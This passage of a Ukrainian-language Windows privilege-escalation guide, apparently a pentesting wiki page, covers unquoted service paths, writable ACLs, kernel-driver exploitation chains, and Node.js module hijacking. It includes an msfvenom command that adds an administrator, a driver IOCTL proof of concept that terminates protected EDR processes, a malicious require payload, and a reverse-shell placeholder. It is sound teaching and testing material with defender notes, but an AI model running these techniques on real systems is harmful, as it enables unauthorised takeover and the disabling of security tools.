Перелічіть усі шляхи служб, не взяті в лапки, за винятком шляхів вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити виконуваний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам указувати дії, які потрібно виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на бінарний файл. Якщо цей бінарний файл можна замінити, може бути можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для увімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного аргументу-файлу інтерпретатора, наприклад PowerShell `-File`. Якщо запланований пакетний файл містить прямий виклик PowerShell `-File`, перевірте також ACL згаданого скрипту; змінні, умовні конструкції та ланцюжки команд оболонки потрібно простежити вручну. Скрипт або батьківський каталог, доступний для запису викликувачу, є підставою перевірити можливість виконання між обліковими записами лише тоді, коли налаштований принципал завдання відрізняється від викликувача і завдання справді доходить до цієї дії. ACL, що дозволяє лише додавання, може мати значення для скриптів, але попередня команда `exit` чи інша логіка керування потоком може зробити додані рядки недосяжними. Перш ніж заявляти про підвищення привілеїв, перевірте ефективні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику керування програмами. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

У NTFS читабельний файл може мати іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликої, релевантної групи доступних резервних копій або файлів конфігурації спершу перегляньте **назви та розміри** потоків, перш ніж відкривати їхній вміст; Windows надає до них доступ через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що вказує на секрет, — лише підстава для подальшої перевірки. Перевірте ефективний доступ на читання до файлу, підтримку потоків файловою системою, наявність у потоці придатних до використання облікових даних і обліковий запис, для автентифікації під яким вони фактично призначені. Під час звичайного переліку уникайте рекурсивного сканування потоків і виведення їхнього вмісту.

## Вхідні дані помічника Windows Driver Kit для запланованих завдань

Необов’язковий Windows Driver Kit містить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` із каталогу запуску. Заплановане завдання або служба, що запускає цей помічник із привілейованим обліковим записом, може перетворити доступ на запис із низькими привілеями до цих вхідних файлів на виконання команд у контексті цього облікового запису, навіть якщо виконуваний файл помічника захищений. Переконайтеся, що споживач має привілеї, а **обидва** додаткові файли можна створити або змінити; самого факту виявлення помічника недостатньо.

Для запланованого завдання перевірте його дію [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) і ACL обох шляхів до додаткових файлів. Якщо для завдання не вказано робочий каталог, каталог виконуваного файлу є лише підставою для перевірки, а не доказом того, звідки завдання читає вхідні дані. Також має бути виконана передумова щодо робочого файлу проєкту. Перевірте фактичного принципала завдання, а не припускайте, що воно запускається від імені SYSTEM.

## Програми

### Встановлені програми

Перевірте **дозволи для бінарних файлів** (можливо, один із них можна перезаписати й підвищити привілеї) та **каталогів** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях виправлення агента Checkmk для Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших агентів Checkmk для Windows, які записували файли команд у `C:\Windows\Temp`, а потім виконували вже наявний файл, захищений від запису, якщо заміна не вдавалася. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень встановлених виправлень і те, чи може виконуватися вразлива операція агента; позначення лише гілки, як-от `2.1`, не дає змоги встановити наявність уразливості. Під час переліку можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби SAML в ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася ADSelfService Plus збірки 6210 і раніших; постачальник виправив її у збірці 6211. Вона актуальна лише якщо SAML SSO **увімкнено або було увімкнено**. Тому запис про встановлений продукт або шлях до служби є лише зачіпкою, а не підтвердженням уразливості: перевірте точну збірку, історію конфігурації SAML, доступність служби з мережі та обліковий запис, під яким вона працює. Виконання коду через службу відбувається з привілеями цього облікового запису; виконання з правами SYSTEM можливе лише для екземпляра, запущеного від SYSTEM. Файл `OfflineBackup_*.ezip`, доступний для читання в каталозі Backup продукту, є окремою зачіпкою щодо зашифрованої резервної копії, а не доказом наявності придатних до використання облікових даних чи цієї вразливості SAML. Під час звичайного переліку зафіксуйте його шлях і права доступу, не розпаковуючи файл.

#### Межі контролера Jenkins і доменного облікового запису

На контролері Jenkins під Windows розрізняйте дозвіл на створення або налаштування завдання та дозвіл на його запуск: [Jenkins описує їх як окремі права `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер може надати інший спосіб запуску збірки, але перевірте, чи його ввімкнено і чи збірка справді запускається. Виконання відбувається від імені контролера або вибраного агента, а збережені облікові дані можна використати лише якщо завдання має доступ до відповідної області їхньої дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає дані облікових записів і ключі шифрування у файлах `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([сховище секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сам факт їхньої наявності не розкриває пароль; перевірте **доступ для читання до потрібних файлів** і окремий шлях повторного використання облікового запису, не виводячи секрети у спільні журнали. Якщо цей обліковий запис має право запису в `scriptPath` об’єкта користувача AD, перш ніж вважати це виконанням від імені іншого користувача, перевірте можливість запису за шляхом скрипту та наявність реального входу в систему або запланованого завдання, яке виконується від імені цільового користувача. Додатковий контроль над групами потребує окремої перевірки фактично чинних прав AD.

#### Ідентичність self-hosted агента Azure Pipelines

Для Azure DevOps Server або проєкту Azure Pipelines розрізняйте дозвіл **створювати або редагувати** pipeline, дозвіл **ставити його в чергу** та дозвіл використовувати вибраний пул агентів; [Microsoft окремо описує дозволи pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може надіслати крок зі скриптом і запустити цей pipeline на self-hosted агенті Windows, крок виконується від імені [облікового запису операційної системи, налаштованого для агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж стверджувати про перехід між обліковими записами або до SYSTEM, перевірте конкретний pipeline, обмеження гілок і ресурсів, авторизований пул, завдання, яке може запускатися, та ідентичність служби агента. Встановлений агент, роль у проєкті або право запису до репозиторію самі по собі є лише зачіпками; під час пасивного переліку перевірте дозволи й локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та який має доступ до її бази даних SQL, і **обліковий запис конектора AD DS**, права якого в каталозі залежать від налаштованих функцій синхронізації. Облікові дані конектора зберігаються в цій базі даних у зашифрованому вигляді, а ключовий матеріал [захищений DPAPI під обліковим записом служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Встановлена служба синхронізації, група з назвою, що натякає на права локального адміністратора, або сам доступ до бази даних не доводять наявність облікових даних, які можна розшифрувати, чи можливість підвищення привілеїв у домені. Окремо перевірте фактичні права на читання бази даних, доступ до облікового запису служби та ключа, структуру інсталяції й SQL, налаштовану ідентичність конектора та її фактичні привілеї в AD. Під час звичайного переліку слід показувати лише метадані служб і доступу, а не запитувати чи виводити збережені секрети.

#### Дозволи на DLL підтримки драйвера принтера

Встановлений драйвер принтера може зберігати DLL підтримки в `C:\ProgramData` і завантажувати їх у привілейованому процесі друку. Перевірте ACL точного каталогу драйвера та DLL, включно з батьківськими каталогами й точками повторної обробки, навіть якщо перелік принтерів через WMI недоступний. У випадку [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) зазначений шлях був `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [в оригінальному описі](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) йдеться про завантаження DLL через `PrintIsolationHost.exe`. ACL, що дозволяє запис, є лише зачіпкою: перевірте фактичний ефективний доступ на запис з урахуванням заборонних записів, чи встановлено відповідний драйвер і чи завантажує він файл із привілейованими правами, а також чи виправив інсталяцію оновлений драйвер або програма безпеки постачальника. Не робіть висновків про вразливість лише з назви каталогу або версії драйвера.

### Дозволи на запис

Перевірте, чи можете ви змінити файл конфігурації, щоб прочитати спеціальний файл, або змінити виконуваний файл, який буде запущено від імені облікового запису адміністратора (schedtasks).

Знайти каталоги й файли зі слабкими дозволами в системі можна так:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Автозавантаження плагінів Notepad++ для закріплення/виконання

Notepad++ автоматично завантажує будь-які DLL плагінів у підкаталогах `plugins`. Якщо є доступна для запису portable-версія або копія програми, додавання шкідливого плагіна забезпечує автоматичне виконання коду в `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і зворотних викликів плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете перезаписати запис реєстру або бінарний файл, який буде виконано від імені іншого користувача.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **розташування autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте потенційні **дивні/вразливі драйвери сторонніх виробників**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в ядрі (поширена проблема в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши SYSTEM-токен із пам’яті ядра.<sup>[[13]](#references)</sup> Покроковий опис техніки наведено тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Пов’язані матеріали з експлуатації ядра Windows:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Для помилок типу race condition, коли вразливий виклик відкриває контрольований атакувальником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF у cancel-safe queue, витоки з paged-pool і pivot-и через I/O ring

Деякі ланцюжки LPE у ядрі Windows можна побудувати на двох окремо слабких помилках: **race condition життєвого циклу cancel-safe queue**, через який запит/CBD звільняється, поки блокування черги ще утримується, і витоку типу **lock-release-before-copy**, що розкриває звільнене виділення paged-pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки з аудиту та експлуатації:

- **Free-under-lock + cancel afterwards**: шукайте шлях успішного завершення з послідовністю **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування виконує **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного завершення доходить до `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до звільнення блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може згодом продовжити виконання й передати звільнений `PFLT_CALLBACK_DATA` назад у callback-функцію видалення драйвера.
- **Повторно використайте звільнений об’єкт черги**, виділивши paged-pool того самого розміру під контролем атакувальника. Записи черги даних `NPFS` корисні, оскільки їхній вміст і розмір можна контролювати, а згодом перевіряти через операції читання/перегляду даних pipe. Якщо звільнений об’єкт містить посилання на список, перезапишіть їх **циклічним списком фальшивих вузлів запиту в пам’яті користувача**, щоб драйвер неодноразово обробляв визначені атакувальником структури запитів замість завершення на початковій голові списку.
- **Підвищте можливості передбачуваного запису**: якщо фальшивий запит перенаправляє вкладений вказівник контексту, що використовується для записів обліку (мітки часу / QPC / поля поруч із refcount), можна отримати запис у ядро, де контролюється **адреса, але не значення**. У такому разі націльтеся на поле **length/size** об’єкта зі spray у пулі замість кінцевого вказівника на код/дані, а потім переберіть об’єкти зі spray, доки пошкоджений об’єкт не забезпечить читання paged-pool за межами буфера.
- **Шаблон витоку з race condition**: будь-який системний виклик, який виконує `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`, — перспективна ціль. Надійність зростає, якщо атакувальник може збільшити буфер, що копіюється (наприклад, додавши багато елементів списку/ресурсів, які збільшують кінцевий розмір виділення серіалізатора), оскільки довше копіювання розширює вікно підміни, не обов’язково спричиняючи збій системи.
- **Цілі для повторного заповнення, насичені вказівниками**: зареєстровані масиви буферів Windows **I/O ring** — чудові цілі для витоку, оскільки їхній розмір у paged-pool контролюється атакувальником (`8 * regBufferCnt`), а кожен елемент є вказівником ядра на `_IOP_MC_BUFFER_ENTRY`. Витік одного такого масиву дає змогу відновити навколишній `IORING_OBJECT`, а потім пошкодити **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені атакувальником записи й надавали довільне читання/запис у ядрі. Якщо єдиний доступний запис дозволяє записати стабільний байт (наприклад, із `KUSER_SHARED_DATA+0x14`), використовуйте **перекривні невирівняні записи**, щоб створити повторюваний байт у вказівнику користувача, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні ознаки для налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Щойно отримаєте довільне читання/запис у ядрі через пошкоджене кільце I/O, викрадіть токен SYSTEM за допомогою стандартного процесу після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті у вулику реєстру

Сучасні вразливості вуликів реєстру дають змогу формувати детерміновані розкладки, зловживати доступними для запису дочірніми розділами HKLM/HKU та перетворювати пошкодження метаданих на переповнення сторінкового пулу ядра без спеціального драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у режимі direct функції `RtlQueryRegistryValues` через контрольовані зловмисником шляхи

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише, чи є він коректним рядком UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT` і передають вказівник на скаляр у стеку, наприклад `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не до типу, який очікував розробник.

Це дає два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу запитувати вибрані зловмисником ключі, розкривати їхню наявність через коди повернення/журнали та іноді читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: скалярне призначення на кшталт `&readValue` може бути інтерпретоване з неправильним типом як `REG_QWORD`, `UNICODE_STRING` або буфер двійкових даних із заданим розміром — залежно від типу значення реєстру.

Практичні примітки щодо експлуатації:

- **Засіб пом’якшення у Windows 8+**: якщо запит звертається до **недовіреного вулика** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з ядра призводять до збою `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **ключі, доступні зловмиснику для запису, у довірених системних вуликах**, а не створюйте значення в `HKCU`.
- **Розміщення даних у довіреному вулику**: використовуйте NtObjectManager, щоб знайти доступні для запису дочірні розділи `\Registry\Machine`, а потім повторіть пошук із дублікатом токена **низького рівня цілісності**, щоб виявити ключі, доступні з ізольованих контекстів:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека та може частково перезаписати сусідній вказівник callback/function.
- **`REG_SZ` / `REG_EXPAND_SZ`**: прямий режим очікує, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спершу завантажує контрольований зловмисником `REG_DWORD` у скалярну змінну на стеку, а потім повторно використовує той самий буфер для читання рядка, зловмисник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що дає напівконтрольований запис у kernel.
- **`REG_BINARY`**: для великих двійкових даних прямий режим трактує перший `LONG` за адресою `EntryContext` як знаковий розмір буфера. Якщо попереднє читання `REG_DWORD` залишає від’ємне контрольоване зловмисником значення в повторно використаній скалярній змінній, наступний запит `REG_BINARY` копіює байти зловмисника безпосередньо поверх сусідніх слотів стека. Це часто найпростіший шлях до повного перезапису вказівника callback.

Надійна закономірність для пошуку: **різнотипні читання з реєстру в ту саму змінну на стеку без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використовувані вказівники `EntryContext` і шляхи виконання, де перше читання з реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN для об’єктів пристроїв (LPE + знищення EDR)

Деякі підписані драйвери сторонніх розробників створюють об’єкти пристроїв із надійним SDDL через IoCreateDeviceSecure, але забувають установити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривають через шлях із додатковим компонентом. Тому будь-який непривілейований користувач може отримати дескриптор, використавши шлях простору імен на кшталт:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, користувач може зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в систему. Приклади можливостей, виявлених у реальних випадках:
- Повернення дескрипторів із повним доступом до довільних процесів (крадіжка токена / запуск оболонки SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис необроблених даних на диску (втручання в систему офлайн, трюки зі збереженням присутності під час завантаження).
- Завершення довільних процесів, зокрема Protected Process/Light (PP/PPL), що дає змогу знищити AV/EDR із user land через kernel.

Мінімальний шаблон PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations for developers
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, які мають бути обмежені за допомогою DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTLs (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте брокерні моделі замість прямих привілеїв ядра.

Detection ideas for defenders
- Відстежуйте відкриття підозрілих імен пристроїв (наприклад, \\ .\\amsdk*) із режиму користувача та певні послідовності IOCTL, що можуть свідчити про зловживання.
- Застосовуйте список заблокованих уразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і ведіть власні списки дозволів і заборон.

## PATH DLL Hijacking

Якщо у вас є **дозвіл на запис до папки, що міститься в PATH**, ви можете перехопити DLL, завантажену процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Щоб дізнатися більше про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **Windows uncontrolled search path**, який впливає на застосунки **Node.js** і **Electron**, коли вони виконують імпорт без зазначення шляху, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, рухаючись угору деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тому застосунок, запущений із `C:\Users\Administrator\project\app.js`, може перевіряти такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або папку пакета) і чекати, доки **процес Node/Electron із вищими привілеями** спробує розв’язати відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тож це призводить до **LPE**, якщо цільовий процес працює від імені адміністратора, запускається через підвищене завдання планувальника/обгортку служби або є автоматично запущеним привілейованим desktop-застосунком.

Таке особливо часто трапляється, коли:

- залежність оголошена в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу після помилки
- пакет видалили зі production-збірок, пропустили під час пакування або не вдалося встановити
- вразливий виклик `require()` розташований глибоко в дереві залежностей, а не в коді основного застосунку

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях розв’язання:<sup>[[23]](#references)</sup>

- Встановіть фільтр `Process Name` = виконуваний файл цільового процесу (`node.exe`, EXE Electron-застосунку або процес-обгортка)
- Встановіть фільтр `Path` `contains` `node_modules`
- Звертайте увагу на `NAME NOT FOUND` і останнє успішне відкриття файлу в `C:\node_modules`

Корисні шаблони для перевірки коду в розпакованих файлах `.asar` або вихідному коді застосунку:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо його ще не існує:

```powershell
mkdir C:\node_modules
```

3. Помістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть застосунок жертви. Якщо застосунок спробує виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, що відповідають цьому шаблону, — `bluebird` і `utf-8-validate`, але повторно використовуваною частиною є **техніка**: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows Node/Electron намагатиметься знайти.

### Ідеї для виявлення та посилення захисту

- Створіть сповіщення, коли користувач створює `C:\node_modules` або записує туди нові файли чи пакети `.js`.
- Виявляйте процеси з високим рівнем цілісності, які читають файли з `C:\node_modules\*`.
- Додавайте всі залежності середовища виконання до production-збірки та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів `try { require("...") } catch {}`, що не виводять помилок.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, у деяких розгортаннях `ws` можна уникнути застарілої перевірки `utf-8-validate`, задавши `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи не прописані жорстко адреси інших відомих комп’ютерів у файлі hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте ззовні, чи доступні служби з обмеженим доступом.

```bash
netstat -ano #Opened ports?
```

Для локального слухача зіставте його PID із власником процесу, шляхом до виконуваного файлу та службою або запланованим завданням, яке його запускає. Служба віддаленого керування може надати доступ із правами свого користувача лише за умови, що це дозволяють її автентифікація та засоби керування командами. Користувацька TCP-програма, що працює від облікового запису з вищими привілеями, потребує окремої перевірки: слухач і шлях до бінарного файлу — це лише пасивні зачіпки, а для пошуку автентифікованого способу експлуатації пошкодження пам’яті потрібно проаналізувати саме цей бінарний файл і доступні для нього вхідні дані. Якщо здається, що відкритий порт належить системному процесу, перш ніж визначати службу на кінцевому вузлі, перевірте його за допомогою [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме лише правило переадресації не доводить, що кінцевий вузол доступний або вразливий.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку з командами, пов’язаними з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення тощо)**

Більше[ команд для переліку мережі тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте root-доступ, то зможете прослуховувати будь-який порт (під час першої спроби прослуховувати порт за допомогою `nc.exe` з’явиться графічний запит, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запускати bash від імені root, спробуйте `--default-user root`

